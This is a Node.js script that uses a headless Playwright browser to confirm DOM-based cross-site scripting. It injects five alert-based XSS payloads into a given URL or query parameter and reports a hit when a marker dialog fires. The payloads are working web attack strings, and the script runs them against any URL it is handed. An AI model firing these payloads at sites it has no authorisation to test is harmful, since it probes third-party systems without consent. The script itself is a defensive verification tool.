'use strict';
// Confirm cross-site scripting by rendering the target in a real browser and injecting payloads that,
// if they execute, raise a dialog carrying a unique marker — the reliable signal for DOM-based XSS that
// a raw HTTP fuzzer (dalfox) cannot see because it never runs the JavaScript. Put `PAYLOAD` in the URL
// where the value goes (query or hash route), or name a query param with `--param`. Only a
// newline-delimited `{kind:"xss-confirmed",...}` record on a hit goes to stdout.
const { chromium } = require('playwright');

function arg(name, fallback) {
  const i = process.argv.indexOf(name);
  return i >= 0 && i + 1 < process.argv.length ? process.argv[i + 1] : fallback;
}

const url = arg('--url');
const param = arg('--param');
const marker = arg('--marker', 'searuXSS7z');
const maxSeconds = parseInt(arg('--max-seconds', '90'), 10);

const payloads = [
  `<img src=x onerror="alert('${marker}')">`,
  `<iframe src="javascript:alert(\`${marker}\`)">`,
  `<svg onload="alert('${marker}')">`,
  `"><script>alert('${marker}')</script>`,
  `<body onpageshow="alert('${marker}')">`,
];

function buildUrl(base, payload) {
  const encoded = encodeURIComponent(payload);
  if (base.includes('PAYLOAD')) return base.split('PAYLOAD').join(encoded);
  if (param) {
    if (new RegExp(`[?&#]${param}=`).test(base)) {
      return base.replace(new RegExp(`(${param}=)[^&]*`), `$1${encoded}`);
    }
    return base + (base.includes('?') ? '&' : '?') + `${param}=${encoded}`;
  }
  return base + (base.includes('?') ? '&' : '?') + `q=${encoded}`;
}

(async () => {
  if (!url) { console.error('xss: missing --url'); process.exit(2); }
  const browser = await chromium.launch({ args: ['--no-sandbox'] });
  const page = await (await browser.newContext({ ignoreHTTPSErrors: true })).newPage();

  let fired = false;
  page.on('dialog', async (dialog) => {
    try {
      if (dialog.message().includes(marker)) fired = true;
      await dialog.dismiss();
    } catch { /* ignore */ }
  });

  const deadline = Date.now() + maxSeconds * 1000;
  for (const payload of payloads) {
    if (Date.now() > deadline) break;
    fired = false;
    const target = buildUrl(url, payload);
    try { await page.goto(target, { waitUntil: 'domcontentloaded', timeout: 15000 }); } catch { /* keep going */ }
    try { await page.waitForTimeout(1200); } catch { /* ignore */ }
    if (fired) {
      process.stdout.write(JSON.stringify({ kind: 'xss-confirmed', payload, url: target }) + '\n');
      break;
    }
  }

  await browser.close();
})().catch((e) => { console.error(e); process.exit(1); });
